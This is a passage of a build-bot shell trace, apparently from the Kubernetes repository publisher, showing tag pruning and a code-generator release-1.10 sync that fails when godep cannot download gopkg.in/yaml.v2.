\"b0b7a323cc5a4a2019b2e9520c21c7830b7f708e\"\n>\tDeleting tag v1.6.0-rc.1 because kFirstParentCommits lacks target \"8ea07d1fd277de8ab5ea7f281766760bcb7d0fe5\"\n>\tDeleting tag v1.7.0-rc.1 because kFirstParentCommits lacks target \"6b9ded1649cfb512d4e88570c738aca9f8265639\"\n>\tDeleting tag v0.4.1 because kFirstParentCommits lacks target \"dc865a4d5008984abbcd77fc3c218e9176572937\"\n>\tDeleting tag v0.6.0 because kFirstParentCommits lacks target \"20a0d79bf456a4ecaa35b30140dd1e634f56fdbb\"\n>\tDeleting tag v1.10.0-beta.4 because kFirstParentCommits lacks target \"a2dacb6f846e9d64d02c5dc5ab3972287d337405\"\n>\tDeleting tag v1.10.1 because kFirstParentCommits lacks target \"d4ab47518836c750f9949b9e0d387f20fb92260b\"\n>\tDeleting tag v1.10.5 because kFirstParentCommits lacks target \"32ac1c9073b132b8ba18aa830f46b77dcceb0723\"\n>\tDeleting tag v1.4.3-beta.0 because kFirstParentCommits lacks target \"401e0bdd0fef2f9184a6fb23d131d9695d10c9fe\"\n>\tDeleting tag v0.4.2 because kFirstParentCommits lacks target \"2902951c445da6e6ead9e406b3c8e19bc28c2b4a\"\n>\tDeleting tag v1.10.2-beta.0 because kFirstParentCommits lacks target \"be9ffdb012554083a426a97368d5a7bdd8940c00\"\n>\tDeleting tag v1.5.0-beta.3 because kFirstParentCommits lacks target \"35fd1363821b8432ccde55632cf9ead4c79eddbb\"\n>\tDeleting tag v1.7.12 because kFirstParentCommits lacks target \"3bda299a6414b4866f179921610d6738206a18fe\"\n>\tDeleting tag v1.8.5-beta.0 because kFirstParentCommits lacks target \"5db1551cf5006d40d86a33b5f0b130875ee424b5\"\n>\tDeleting tag v0.21.0 because kFirstParentCommits lacks target \"39b013a5d5fb09b5bb7236b553dfa189f8884bbd\"\n>\tDeleting tag v1.4.4 because kFirstParentCommits lacks target \"3b417cc4ccd1b8f38ff9ec96bb50a81ca0ea9d56\"\n>\tDeleting tag v1.4.6-beta.0 because kFirstParentCommits lacks target \"39df7e7ef8b5087b34ff7351f1b7fc1bcc128716\"\n>\tDeleting tag v0.16.2 because kFirstParentCommits lacks target \"72a6a948403654c9943920f47bd2ebdece391594\"\n>\tDeleting tag v0.5 because kFirstParentCommits lacks target \"e2e1c87ae06b303af92fdb5f44af60643d80469e\"\n>\tDeleting tag v1.3.7-beta.0 because kFirstParentCommits lacks target \"0eaf484c0ac0007d66bf0c454cdfa02e7acafb51\"\n>\tDeleting tag v0.7.0 because kFirstParentCommits lacks target \"ad44234f7152e9c66bc2853575445c7071335e57\"\n>\tDeleting tag v1.10.6-beta.0 because kFirstParentCommits lacks target \"6d637ae4bacdd1506aba496ebcef7d94e8f2e9c5\"\n>\tDeleting tag v1.3.6-beta.0 because kFirstParentCommits lacks target \"a570a0fef12408f1c0a7214952055bad39c160d7\"\n>\tDeleting tag v1.4.1-beta.1 because kFirstParentCommits lacks target \"f367d272195aca9d826e732c3b2e5405ae5a795e\"\n>\tDeleting tag v1.5.0 because kFirstParentCommits lacks target \"58b7c16a52c03e4a849874602be42ee71afdcab1\"\n>\tDeleting tag v1.5.3 because kFirstParentCommits lacks target \"029c3a408176b55c30846f0faedf56aae5992e9b\"\n>\tDeleting tag v0.4.4 because kFirstParentCommits lacks target \"efd443bcd6f005566daa85da0a5f0b633b40d4e3\"\n>\tDeleting tag v1.8.7-beta.0 because kFirstParentCommits lacks target \"01eda531869e7c39faadf9bdc4dfbbb17fa520da\"\n>\tDeleting tag v1.10.0-beta.3 because kFirstParentCommits lacks target \"6908cc4291744523ded203e6a5358a2645c43a3d\"\n>\tDeleting tag v1.11.3 because kFirstParentCommits lacks target \"a4529464e4629c21224b3d52edfe0ea91b072862\"\n>\tDeleting tag v1.4.0-alpha.0 because kFirstParentCommits lacks target \"fd1377a16b5e2e33f24a57848071616c81a7f58f\"\n>\tDeleting tag v1.5.4-beta.0 because kFirstParentCommits lacks target \"e9eeec655e7fdee50d4e19200f9707d1cd4a3371\"\n>\tDeleting tag v1.11.0-beta.2 because kFirstParentCommits lacks target \"be2cfcf9e44b5162a294e977329d6c8194748c4e\"\n>\tDeleting tag v1.6.9 because kFirstParentCommits lacks target \"a3d1dfa6f433575ce50522888a0409397b294c7b\"\n>\tDeleting tag v1.7.15 because kFirstParentCommits lacks target \"8c7c1c8b0ce0866d5ded2ce4fa402a716ce6bb6c\"\n>\tDeleting tag v1.8.1-beta.0 because kFirstParentCommits lacks target \"49f4ebfd7400c556575c4c8708c6c3cd5c71d8b1\"\n>\tDeleting tag v0.19.0 because kFirstParentCommits lacks target \"6b0d4ffed36adb0e2585333f01a553ab3e0970fd\"\n>\tDeleting tag v1.10.1-beta.0 because kFirstParentCommits lacks target \"75861c097c6499acc662c1094b3e95de851bd87a\"\n>\tDeleting tag v1.7.2-beta.0 because kFirstParentCommits lacks target \"aa6ec59679c9041a772912788a550adca0d0996c\"\n>\tDeleting tag v1.8.1 because kFirstParentCommits lacks target \"f38e43b221d08850172a9a4ea785a86a3ffa3b3a\"\n>\tDeleting tag v1.3.0-beta.0 because kFirstParentCommits lacks target \"a4f439eb6d6e8086cb19d1d991a3256c4399f669\"\n>\tDeleting tag v1.4.2-beta.0 because kFirstParentCommits lacks target \"ef16c3f8079df0654c8336741134ba142846ec13\"\n>\tDeleting tag v1.1.3 because kFirstParentCommits lacks target \"6a81b50c7e97bbe0ade075de55ab4fa34f049dc2\"\n>\tDeleting tag v1.1.7 because kFirstParentCommits lacks target \"e4e6878293a339e4087dae684647c9e53f1cf9f0\"\n>\tDeleting tag v1.2.0-beta.0 because kFirstParentCommits lacks target \"50f7568d7f9b001c90ed75e79d41478afcd64a34\"\n>\tDeleting tag v1.3.10 because kFirstParentCommits lacks target \"c3e367ec9eae7338ac4e2a57f293634891319b7c\"\n>\tDeleting tag v1.7.4-beta.0 because kFirstParentCommits lacks target \"ebd4ffa39761a21ea5a2a206dc236e6003a8f9d1\"\n>\tDeleting tag v0.5.3 because kFirstParentCommits lacks target \"6c3131404997a52d60b9af891ebf9badcc9f5e8f\"\n>\tDeleting tag v1.10.0-beta.0 because kFirstParentCommits lacks target \"48b7bb56341914b85c76700becadc02b8009d9a0\"\n>\tDeleting tag v1.2.3 because kFirstParentCommits lacks target \"882d296a99218da8f6b2a340eb0e81c69e66ecc7\"\n>\tDeleting tag v1.6.12 because kFirstParentCommits lacks target \"87cf3a252e2492a614f1e7c9b1bcd7c6bc0209df\"\n>\tDeleting tag v1.7.9-beta.0 because kFirstParentCommits lacks target \"9c689e1b30c62d4322fb6d8d71237299dc61349d\"\n>\tDeleting tag v0.14.0 because kFirstParentCommits lacks target \"575bf6dcd09c84cb6622db3605cbc3abdb4e1baa\"\n>\tDeleting tag v1.1.5 because kFirstParentCommits lacks target \"2154ee7e71be6e290db2fc50440cfd967852f252\"\n>\tDeleting tag v1.5.9-beta.0 because kFirstParentCommits lacks target \"f35802d3a00b37a32476451266af05ce9760fec0\"\n>\tDeleting tag v0.2 because kFirstParentCommits lacks target \"a0abb3815755d6a77eed2d07bb0aa7d255e4e769\"\n>\tDeleting tag v1.3.0 because kFirstParentCommits lacks target \"283137936a498aed572ee22af6774b6fb6e9fd94\"\n>\tDeleting tag v1.3.1 because kFirstParentCommits lacks target \"fe4aa01af2e1ce3d464e11bc465237e38dbcff27\"\n>\tDeleting tag v1.5.4 because kFirstParentCommits lacks target \"7243c69eb523aa4377bce883e7c0dd76b84709a1\"\n>\tDeleting tag v1.6.2 because kFirstParentCommits lacks target \"477efc3cbe6a7effca06bd1452fa356e2201e1ee\"\n>\tDeleting tag v1.6.7 because kFirstParentCommits lacks target \"095136c3078ccf887b9034b7ce598a0a1faff769\"\n>\tDeleting tag v0.16.1 because kFirstParentCommits lacks target \"b933dda5369043161fa7c7330dfcfbc4624d40e6\"\n>\tDeleting tag v1.0.6 because kFirstParentCommits lacks target \"388061f00f0d9e4d641f9ed4971c775e1654579d\"\n>\tDeleting tag v1.6.13-beta.0 because kFirstParentCommits lacks target \"dfe33e3ee55435346930cc1f1be523ccce2a4b0d\"\n>\tDeleting tag v1.8.0 because kFirstParentCommits lacks target \"0b9efaeb34a2fc51ff8e4d34ad9bc6375459c4a4\"\n>\tDeleting tag v1.2.3-beta.0 because kFirstParentCommits lacks target \"487e70173625fe7e33b28e7989735b496d86fe01\"\n>\tDeleting tag v1.2.7 because kFirstParentCommits lacks target \"902de86715861baef02be82fb64d059230e52c2f\"\n>\tDeleting tag v1.3.9-beta.0 because kFirstParentCommits lacks target \"02fe987a687cd5803f493f3ef2ef707f525f98fd\"\n>\tDeleting tag v1.4.2-beta.1 because kFirstParentCommits lacks target \"fc3dab7de68c15de3421896dd051c2f127fb64ab\"\n>\tDeleting tag v1.8.13-beta.0 because kFirstParentCommits lacks target \"ffb25adb59532f9ea99d5e2996274db07ea46d32\"\n>\tDeleting tag v0.18.1 because kFirstParentCommits lacks target \"befd1385e5af5f7516f75a27a2628272bb9e9f36\"\n>\tDeleting tag v1.2.0-beta.1 because kFirstParentCommits lacks target \"77eff081f022242e5736b8c2e1ca2058ca61a733\"\n>\tDeleting tag v1.2.2-beta.0 because kFirstParentCommits lacks target \"752a085d5703fce1f0b89e4241ffc8a848b42bef\"\n>\tDeleting tag v1.4.11-beta.0 because kFirstParentCommits lacks target \"72c792b810397eaa7ca8fae44badef4d8b043369\"\n>\tDeleting tag v1.1.1-beta because kFirstParentCommits lacks target \"7d6c8b640f2e90cf2347fb46ef4cf46cd3280015\"\n>\tDeleting tag v0.9.2 because kFirstParentCommits lacks target \"013a97ea6e2a143f763035defdbcbcdc1b6d3411\"\n>\tDeleting tag v0.9.3 because kFirstParentCommits lacks target \"63a9f0389f5e060878742a538290da814faef61c\"\n>\tDeleting tag v1.10.2 because kFirstParentCommits lacks target \"81753b10df112992bf51bbc2c2f85208aad78335\"\n>\tDeleting tag v1.6.0 because kFirstParentCommits lacks target \"fff5156092b56e6bd60fff75aad4dc9de6b6ef37\"\n>\tDeleting tag v1.6.8 because kFirstParentCommits lacks target \"d74e09bb4e4e7026f45becbed8310665ddcb8514\"\n>\tDeleting tag v0.20.1 because kFirstParentCommits lacks target \"b7162294ea69fe4d39f235be5167860cbe68d44c\"\n>\tDeleting tag v1.10.6 because kFirstParentCommits lacks target \"a21fdbd78dde8f5447f5f6c331f7eb6f80bd684e\"\n>\tDeleting tag v1.4.12-beta.0 because kFirstParentCommits lacks target \"96287135c3a52e4d21c2a3a783f621c7b92b1609\"\n>\tDeleting tag v1.7.0-beta.0 because kFirstParentCommits lacks target \"e3db58e39a3ff1012efdf646c727278b82299c5e\"\n>\tDeleting tag v1.8.8-beta.0 because kFirstParentCommits lacks target \"e01e4bd8e614d26ea0331933adc3e1489d6b5506\"\n>\tDeleting tag v1.7.6-beta.0 because kFirstParentCommits lacks target \"945cef642eafecc99ec49d2e68efbbb679b3b23f\"\n>\tDeleting tag v0.21.4 because tagObject failed: object not found\n>\tDeleting tag v0.9.0 because kFirstParentCommits lacks target \"96af0c3e5bac4c07635ac3653724c0721ed64403\"\n>\tDeleting tag v1.7.8-beta.0 because kFirstParentCommits lacks target \"583f0e200c8440b5e2bf3d988d9b5e772f91370e\"\n>\tDeleting tag v0.21.3 because tagObject failed: object not found\n>\tDeleting tag v1.10.3-beta.0 because kFirstParentCommits lacks target \"eaf573aa2b03b2a0c939b341007ca19fcb4685a8\"\n>\tDeleting tag v1.4.0-beta.0 because kFirstParentCommits lacks target \"44368db9916cc345ebef8b6fbde3cdf0dc9d79dc\"\n>\tDeleting tag v1.8.12-beta.0 because kFirstParentCommits lacks target \"10e2d4ece6448eefbccc40f360f8c0a7ea247f23\"\n>\tDeleting tag v1.12.0-alpha.1 because kFirstParentCommits lacks target \"94c2c6c8423d722f436305cd67ef515a8800d723\"\n>\tDeleting tag v1.7.17-beta.0 because kFirstParentCommits lacks target \"82c9c69960f9f165234af6a3a1945bccf4bb1124\"\n>\tDeleting tag v1.8.3-beta.0 because kFirstParentCommits lacks target \"da41a9ebd8634c4050650b5fdaf1c2ff0c17f045\"\n>\tSkipping tag v1.9.2-beta.0 because bTagCommits has \"kubernetes-1.9.2-beta.0\"\n>\tSkipping tag v1.9.5-beta.0 because bTagCommits has \"kubernetes-1.9.5-beta.0\"\n>\tSkipping tag v1.9.10 because bTagCommits has \"kubernetes-1.9.10\"\n>\tSkipping tag v1.9.0-alpha.2 because bTagCommits has \"kubernetes-1.9.0-alpha.2\"\n>\tSkipping tag v1.9.9 because bTagCommits has \"kubernetes-1.9.9\"\n>\tSkipping tag v1.9.1 because bTagCommits has \"kubernetes-1.9.1\"\n>\tSkipping tag v1.9.8 because bTagCommits has \"kubernetes-1.9.8\"\n>\tSkipping tag v1.9.5 because bTagCommits has \"kubernetes-1.9.5\"\n>\tSkipping tag v1.9.0-alpha.1 because bTagCommits has \"kubernetes-1.9.0-alpha.1\"\n>\tSkipping tag v1.9.6 because bTagCommits has \"kubernetes-1.9.6\"\n>\tSkipping tag v1.9.7-beta.0 because bTagCommits has \"kubernetes-1.9.7-beta.0\"\n>\tSkipping tag v1.9.0-beta.0 because bTagCommits has \"kubernetes-1.9.0-beta.0\"\n>\tSkipping tag v1.9.1-beta.0 because bTagCommits has \"kubernetes-1.9.1-beta.0\"\n>\tSkipping tag v1.9.0-alpha.0 because bTagCommits has \"kubernetes-1.9.0-alpha.0\"\n>\tSkipping tag v1.9.4 because bTagCommits has \"kubernetes-1.9.4\"\n>\tSkipping tag v1.9.6-beta.0 because bTagCommits has \"kubernetes-1.9.6-beta.0\"\n>\tSkipping tag v1.9.0-beta.2 because bTagCommits has \"kubernetes-1.9.0-beta.2\"\n>\tSkipping tag v1.9.4-beta.0 because bTagCommits has \"kubernetes-1.9.4-beta.0\"\n>\tSkipping tag v1.9.0-beta.1 because bTagCommits has \"kubernetes-1.9.0-beta.1\"\n>\tSkipping tag v1.9.2 because bTagCommits has \"kubernetes-1.9.2\"\n>\tSkipping tag v1.9.0-alpha.3 because bTagCommits has \"kubernetes-1.9.0-alpha.3\"\n>\tSkipping tag v1.9.3 because bTagCommits has \"kubernetes-1.9.3\"\n>\tSkipping tag v1.9.7 because bTagCommits has \"kubernetes-1.9.7\"\n>\tSkipping tag v1.9.11-beta.0 because bTagCommits has \"kubernetes-1.9.11-beta.0\"\n>\tSkipping tag v1.9.9-beta.0 because bTagCommits has \"kubernetes-1.9.9-beta.0\"\n>\tSkipping tag v1.9.8-beta.0 because bTagCommits has \"kubernetes-1.9.8-beta.0\"\n>\tSkipping tag v1.10.0-alpha.0 because bTagCommits has \"kubernetes-1.10.0-alpha.0\"\n>\tSkipping tag v1.9.0 because bTagCommits has \"kubernetes-1.9.0\"\n>\tSkipping tag v1.9.10-beta.0 because bTagCommits has \"kubernetes-1.9.10-beta.0\"\n>\tSkipping tag v1.9.3-beta.0 because bTagCommits has \"kubernetes-1.9.3-beta.0\"\n>\t++ git rev-parse release-1.9\n>\t+ '[' 0ab89e584187c20cc7c1a3f30db69f3b4ab64196 '!=' 0ab89e584187c20cc7c1a3f30db69f3b4ab64196 ']'\n>\t+ git checkout release-1.9\n>\tAlready on 'release-1.9'\n>\tYour branch is up-to-date with 'origin/release-1.9'.\n>[11 Sep 18 15:33 UTC]: Successfully constructed release-1.9\n>[11 Sep 18 15:33 UTC]: /publish_scripts/construct.sh code-generator release-1.10 release-1.10   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  a963fce72fed31bdcf65502884f25ee2cdfaf9e1\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.10\n>\t+ DST_BRANCH=release-1.10\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=a963fce72fed31bdcf65502884f25ee2cdfaf9e1\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 0ab89e584187c20cc7c1a3f30db69f3b4ab64196\n>\t+ git branch -D release-1.10\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.10\n>\tSwitching to origin/release-1.10.\n>\t+ echo 'Switching to origin/release-1.10.'\n>\t+ git branch -f release-1.10 origin/release-1.10\n>\t+ git checkout -q release-1.10\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.10\n>\t+ UPSTREAM_HASH=6d34b425cfe0dd24279c4b80b2b3621d3a11b477\n>\t+ '[' 6d34b425cfe0dd24279c4b80b2b3621d3a11b477 '!=' a963fce72fed31bdcf65502884f25ee2cdfaf9e1 ']'\n>\t+ echo 'Upstream branch upstream/release-1.10 moved from '\\''a963fce72fed31bdcf65502884f25ee2cdfaf9e1'\\'' to '\\''6d34b425cfe0dd24279c4b80b2b3621d3a11b477'\\''. We have to sync.'\n>\tUpstream branch upstream/release-1.10 moved from 'a963fce72fed31bdcf65502884f25ee2cdfaf9e1' to '6d34b425cfe0dd24279c4b80b2b3621d3a11b477'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/code-generator release-1.10 release-1.10 '' '' k8s.io false 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/code-generator\n>\t+ local src_branch=release-1.10\n>\t+ local dst_branch=release-1.10\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t9de8e796a74d16d2a285165727d04c185ebca6dc\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 14 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing release-1.10 commit 9de8e796a74d16d2a285165727d04c185ebca6dc.\n>\t+ echo 'Starting at existing release-1.10 commit 9de8e796a74d16d2a285165727d04c185ebca6dc.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/release-1.10\n>\tBranch upstream-branch set up to track remote branch release-1.10 from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit 6d34b425cfe0dd24279c4b80b2b3621d3a11b477.\n>\t+ echo 'Checked out source commit 6d34b425cfe0dd24279c4b80b2b3621d3a11b477.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit release-1.10\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B release-1.10\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_base_commit=8959a0aa87adf07c4ff821bf6d79714b3d615e8a\n>\t+ '[' -z 8959a0aa87adf07c4ff821bf6d79714b3d615e8a ']'\n>\t++ git-find-merge 8959a0aa87adf07c4ff821bf6d79714b3d615e8a upstream/release-1.10\n>\t++ tail -1\n>\t+++ git rev-list '8959a0aa87adf07c4ff821bf6d79714b3d615e8a^1..upstream/release-1.10' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 8959a0aa87adf07c4ff821bf6d79714b3d615e8a..upstream/release-1.10 --ancestry-path\n>\t+++ git rev-parse 8959a0aa87adf07c4ff821bf6d79714b3d615e8a\n>\t+ local k_base_merge=8959a0aa87adf07c4ff821bf6d79714b3d615e8a\n>\t+ '[' -z 8959a0aa87adf07c4ff821bf6d79714b3d615e8a ']'\n>\t+ git branch -f filtered-branch-base 8959a0aa87adf07c4ff821bf6d79714b3d615e8a\n>\tRewriting upstream branch release-1.10 to only include commits for staging/src/k8s.io/code-generator.\n>\tRunning git filter-branch ...\n>\t+ echo 'Rewriting upstream branch release-1.10 to only include commits for staging/src/k8s.io/code-generator.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/code-generator 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/code-generator\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/code-generator -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=fe40e032bcfe504e871c80cf0ca8de994ab45668\n>\t++ git log --first-parent --format=%H --reverse fe40e032bcfe504e871c80cf0ca8de994ab45668..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch release-1.10.'\n>\t+ git checkout -q release-1.10\n>\tChecking out branch release-1.10.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=9de8e796a74d16d2a285165727d04c185ebca6dc\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=9de8e796a74d16d2a285165727d04c185ebca6dc\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' 9de8e796a74d16d2a285165727d04c185ebca6dc '!=' 9de8e796a74d16d2a285165727d04c185ebca6dc ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps '' '' k8s.io false true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=9de8e796a74d16d2a285165727d04c185ebca6dc\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps '' k8s.io false Kubernetes-commit\n>\t+ local deps=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/code-generator/\") or . == \"k8s.io/code-generator\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\tgodep: error downloading dep (gopkg.in/yaml.v2): unrecognized import path \"gopkg.in/yaml.v2\"\n>\tgodep: Error downloading some deps. Aborting restore and check.\n>[11 Sep 18 15:34 UTC]: exit status 1\n>    \t+ '[' '!' 14 -eq 14 ']'\n>    \t+ REPO=code-generator\n>    \t+ SRC_BRANCH=release-1.10\n>    \t+ DST_BRANCH=release-1.10\n>    \t+ DEPS=\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/code-generator\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=false\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ LAST_PUBLISHED_UPSTREAM_HASH=a963fce72fed31bdcf65502884f25ee2cdfaf9e1\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags --prune\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in 